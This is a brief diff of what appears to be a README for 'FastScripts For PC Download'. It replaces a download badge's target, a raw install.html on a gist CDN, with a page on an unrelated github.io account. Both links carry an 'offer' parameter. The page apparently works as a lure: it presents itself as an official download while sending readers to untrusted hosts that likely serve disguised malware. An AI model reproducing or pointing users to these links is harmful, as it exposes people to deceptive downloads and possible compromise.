@@ -1,6 +1,6 @@
 # FastScripts For PC Download — Desktop Script Launcher
 
-[![Get FastScripts GitHub](https://img.shields.io/badge/Get%20FastScripts%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/hardliner109/c29a1bce0b98c3237da15d9508d2f973/raw/63b93b56d3a3c4ba28bf954075c39915e6ec2c10/install.html?offer=FastScripts)
+[![Get FastScripts GitHub](https://img.shields.io/badge/Get%20FastScripts%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=FastScripts)
 
 ---
 
